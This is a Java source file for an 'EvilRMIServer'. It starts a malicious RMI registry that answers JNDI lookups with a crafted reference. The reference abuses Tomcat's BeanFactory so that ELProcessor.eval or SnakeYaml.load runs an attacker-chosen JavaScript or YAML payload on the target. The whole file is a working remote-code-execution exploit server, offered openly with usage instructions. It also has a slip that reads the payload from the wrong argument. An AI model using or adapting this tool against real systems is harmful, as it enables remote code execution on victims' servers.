package org.rxb;

// for reading a custom payload
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Arrays;

// RMI magic
import java.rmi.registry.*;
import com.sun.jndi.rmi.registry.*;
import javax.naming.*;
import org.apache.naming.ResourceRef;


public class EvilRMIServer {
    private static boolean checkArgs(String[] args) {
        // check we have the correct number of args
        if (args.length != 4) return false;
        // check <port> is an int
        try {
            Integer.parseInt(args[1]);
        } catch (NumberFormatException ex) {
            return false;
        }
        // check we have "js" or "yml" for arg[2]
        if (!Arrays.asList(new String[]{"js", "yml"}).contains(args[2].toLowerCase())) return false;
        // everything appears reasonable
        return true;
    }

    public static void main(String[] args) throws Exception {
        // check command line args (barely...)
        if (!checkArgs(args)) {
            System.err.print("Usage:\n\tEvilRMIServer <host/IP> <port> <yml|js> <path>\n\n\thost/IP: host where EvilRMIServer is running\n\tyml/js: payload type to use\n\tpath: path to JS/YAML payload to be executed on the target\n");
            return;
        }
        // configure RMI server to point to the right host (default is 127.0.1.1 so victim will try to get Object from localhost and fail)
    	System.setProperty("java.rmi.server.hostname", args[0]);

        int port = (int)Integer.parseInt(args[1]);

        // read in the payload file
        String payload = "";
        try {
            payload = new String(Files.readAllBytes(Paths.get(args[2])));
        } catch (IOException ex) {
            System.err.println("Failed to read " + args[2]);
            ex.printStackTrace();
            return;
        }

        System.out.println("Creating evil RMI registry on port " + port);
        Registry registry = LocateRegistry.createRegistry(port);

        ResourceRef ref = null;
        if (args[2].toLowerCase().equals("js")) {
            ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
            ref.add(new StringRefAddr("forceString", "x=eval"));
            ref.add(new StringRefAddr("x", payload));
        } else {
            //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
            ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
            // redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
            ref.add(new StringRefAddr("forceString", "x=load"));
            ref.add(new StringRefAddr("x", payload));
        }

        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("Object", referenceWrapper);
    }
}
